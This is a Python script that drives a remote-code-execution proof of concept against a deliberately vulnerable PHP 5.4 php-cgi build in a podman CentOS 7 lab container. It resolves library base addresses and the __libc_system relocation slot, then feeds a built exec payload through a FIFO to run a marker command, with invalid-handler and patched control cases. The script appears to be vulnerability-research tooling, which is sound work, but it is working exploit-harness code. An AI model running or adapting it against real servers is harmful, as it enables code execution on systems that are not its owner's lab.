#!/usr/bin/env python3
"""Run native RCE, invalid-handler, or patched php-cgi control cases."""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import secrets
import signal
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]
sys.path.insert(0, str(ROOT))

from poc.build_payload import build_exec, build_invalid_handler_control  # noqa: E402
from lab.centos7.lab_runtime import (  # noqa: E402
    dynamic_symbol_offset,
    mapping_bases,
    marker_stat,
    read_qword,
    relocation_offset,
    select_mapping,
    top_processes,
    wait_for_process,
)

LIBPTHREAD = "/lib64/libpthread-2.17.so"
LIBC = "/lib64/libc-2.17.so"
SCRIPT = "/opt/php54-uaf/vuln_app.php"


def run_case(
    *,
    container: str,
    run_dir: Path,
    php_cgi: str,
    expectation: str,
    timeout: float = 6.0,
) -> dict[str, object]:
    if expectation not in {"rce", "invalid-handler", "patched"}:
        raise ValueError("expectation must be rce, invalid-handler, or patched")

    run_dir = run_dir.resolve()
    run_dir.mkdir(parents=True, exist_ok=True)
    token = secrets.token_hex(2)[:3]
    marker = run_dir / token
    fifo = run_dir / f"{token}.fifo"
    command = f">/x/{token}".encode("ascii")
    if len(command) != 7:
        raise AssertionError("marker command must occupy exactly seven bytes")
    for path in (marker, fifo):
        if path.exists() or path.is_symlink():
            path.unlink()

    before = {process.host_pid for process in top_processes(container)}
    os.mkfifo(fifo, 0o600)
    keep_fd = os.open(fifo, os.O_RDWR)
    read_fd = os.open(fifo, os.O_RDONLY)
    argv = [
        "podman", "exec", "-i",
        "-e", "REQUEST_METHOD=POST",
        "-e", "CONTENT_TYPE=application/octet-stream",
        "-e", "CONTENT_LENGTH=176",
        "-e", "REDIRECT_STATUS=1",
        "-e", f"SCRIPT_FILENAME={SCRIPT}",
        "-e", "SERVER_PROTOCOL=HTTP/1.1",
        container, php_cgi, "-n", "-d", "date.timezone=UTC", "-q",
    ]
    process = subprocess.Popen(
        argv,
        stdin=read_fd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    os.close(read_fd)
    target_pid: int | None = None
    timed_out = False
    try:
        target = wait_for_process(
            container,
            lambda item: Path(php_cgi).name in item.args,
            exclude_host_pids=before,
            timeout=10.0,
        )
        target_pid = target.host_pid
        bases = mapping_bases(target.host_pid)
        pthread_base, pthread_path = select_mapping(bases, ("libpthread-", "libpthread.so"))
        libc_base, libc_path = select_mapping(bases, ("libc-", "libc.so"))
        slot_offset = relocation_offset(container, LIBPTHREAD, "__libc_system")
        system_offset = dynamic_symbol_offset(container, LIBC, "system")
        slot = pthread_base + slot_offset
        slot_target = read_qword(target.host_pid, slot)
        expected_system = libc_base + system_offset
        if slot_target != expected_system:
            raise RuntimeError(f"system slot mismatch: {slot_target:#x} != {expected_system:#x}")

        if expectation == "invalid-handler":
            payload = build_invalid_handler_control(command)
        else:
            payload = build_exec(command, pthread_base, slot_offset)
        payload_sha256 = hashlib.sha256(payload).hexdigest()
        os.write(keep_fd, payload)
        os.close(keep_fd)
        keep_fd = -1

        try:
            stdout, stderr = process.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            timed_out = True
            os.kill(target.host_pid, signal.SIGKILL)
            stdout, stderr = process.communicate(timeout=3.0)

        marker_created = marker.exists()
        result = {
            "case": expectation,
            "php_cgi": php_cgi,
            "command_hex": command.hex(),
            "payload_bytes": len(payload),
            "payload_sha256": payload_sha256,
            "host_pid": target.host_pid,
            "pthread_path": pthread_path,
            "pthread_base": hex(pthread_base),
            "libc_path": libc_path,
            "libc_base": hex(libc_base),
            "system_slot_offset": hex(slot_offset),
            "system_slot": hex(slot),
            "system_slot_target": hex(slot_target),
            "expected_system": hex(expected_system),
            "podman_exec_returncode": process.returncode,
            "timed_out_then_killed": timed_out,
            "stdout": stdout.decode("latin1", "replace"),
            "stderr": stderr.decode("latin1", "replace"),
            "marker_created": marker_created,
            "marker": marker_stat(marker) if marker_created else None,
        }
        if expectation == "rce":
            result["success"] = marker_created
        elif expectation == "invalid-handler":
            result["success"] = not marker_created and process.returncode != 0
        else:
            result["success"] = not marker_created and process.returncode == 0 and "rows=1" in result["stdout"]
        return result
    finally:
        if keep_fd >= 0:
            os.close(keep_fd)
        if process.poll() is None:
            if target_pid is not None:
                try:
                    os.kill(target_pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
            process.kill()
            process.communicate()
        for path in (marker, fifo):
            try:
                path.unlink()
            except FileNotFoundError:
                pass


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--container", required=True)
    parser.add_argument("--run-dir", type=Path, required=True)
    parser.add_argument("--php-cgi", default="/usr/bin/php-cgi")
    parser.add_argument("--expect", choices=("rce", "invalid-handler", "patched"), default="rce")
    args = parser.parse_args()
    result = run_case(
        container=args.container,
        run_dir=args.run_dir,
        php_cgi=args.php_cgi,
        expectation=args.expect,
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
